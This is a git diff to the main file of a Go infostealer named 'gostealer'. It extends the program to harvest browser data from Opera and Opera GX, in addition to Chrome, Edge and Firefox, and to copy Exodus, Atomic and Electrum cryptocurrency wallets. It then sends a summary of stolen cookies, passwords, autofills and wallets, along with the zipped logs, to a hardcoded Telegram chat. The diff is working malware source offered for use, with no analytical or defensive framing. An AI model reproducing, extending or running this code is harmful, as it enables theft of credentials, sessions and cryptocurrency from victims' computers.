@@ -8,6 +8,7 @@ import (
 
 	"github.com/4kord/gostealer/browsers"
 	"github.com/4kord/gostealer/utils"
+	"github.com/4kord/gostealer/wallets"
 	"github.com/alexmullins/zip"
 	"github.com/joho/godotenv"
 
@@ -26,19 +27,61 @@ func main() {
 	edgePath := path.Join(os.Getenv("localappdata"), `Microsoft\Edge\User Data`)
 	chromePath := path.Join(os.Getenv("localappdata"), `Google\Chrome\User Data`)
 	firefoxPath := path.Join(os.Getenv("appdata"), `Mozilla\Firefox\Profiles`)
+	operaPath := path.Join(os.Getenv("appdata"), `Opera Software\Opera Stable`)
+	operaGXPath := path.Join(os.Getenv("appdata"), `Opera Software\Opera GX Stable`)
 
 	//Yoink
-	wg.Add(4)
+	wg.Add(9)
+	if _, err := os.Stat(chromePath); !os.IsNotExist(err) {
+		go func() {
+			browsers.Chrome(chromePath, logFolderPath)
+			wg.Done()
+		}()
+	} else {
+		wg.Done()
+	}
+	if _, err := os.Stat(edgePath); !os.IsNotExist(err) {
+		go func() {
+			browsers.Edge(edgePath, logFolderPath)
+			wg.Done()
+		}()
+	} else {
+		wg.Done()
+	}
+	if _, err := os.Stat(firefoxPath); !os.IsNotExist(err) {
+		go func() {
+			browsers.Firefox(firefoxPath, logFolderPath)
+			wg.Done()
+		}()
+	} else {
+		wg.Done()
+	}
+	if _, err := os.Stat(operaPath); !os.IsNotExist(err) {
+		go func() {
+			browsers.Opera(operaPath, logFolderPath)
+			wg.Done()
+		}()
+	} else {
+		wg.Done()
+	}
+	if _, err := os.Stat(operaGXPath); !os.IsNotExist(err) {
+		go func() {
+			browsers.OperaGX(operaGXPath, logFolderPath)
+			wg.Done()
+		}()
+	} else {
+		wg.Done()
+	}
 	go func() {
-		browsers.Chrome(chromePath, logFolderPath)
+		wallets.CopyExodus(logFolderPath)
 		wg.Done()
 	}()
 	go func() {
-		browsers.Edge(edgePath, logFolderPath)
+		wallets.CopyAtomic(logFolderPath)
 		wg.Done()
 	}()
 	go func() {
-		browsers.Firefox(firefoxPath, logFolderPath)
+		wallets.CopyElectrum(logFolderPath)
 		wg.Done()
 	}()
 	go func() {
@@ -83,7 +126,7 @@ func main() {
 		Bytes: file,
 	})
 
-	msg := tgbotapi.NewMessage(-1001563265930, fmt.Sprintf("\xF0\x9F\x94\x94 NEW LOG\n\xF0\x9F\x8D\xAA COOKIES: %d\n\xF0\x9F\x94\x92 PASSWORDS: %d\n\xF0\x9F\x94\x93 AUTOFILLS: %d\n\xF0\x9F\x92\xB3 WALLETS: %d%s", utils.CookieAmount, utils.PasswordAmount, utils.AutofillAmount, utils.WalletAmount, utils.InfoStr))
+	msg := tgbotapi.NewMessage(-1001563265930, fmt.Sprintf("\xF0\x9F\x94\x94 NEW LOG\n\xF0\x9F\x8D\xAA COOKIES: %d\n\xF0\x9F\x94\x92 PASSWORDS: %d\n\xF0\x9F\x94\x93 AUTOFILLS: %d\n\xF0\x9F\x92\xB3 WALLETS: %d\n--------\n%s\n--------%s", utils.CookieAmount, utils.PasswordAmount, utils.AutofillAmount, utils.WalletAmount, utils.FoundWallets, utils.InfoStr))
 	bot.Send(msg)
 
 	bot.Send(tgbotapi.MediaGroupConfig{
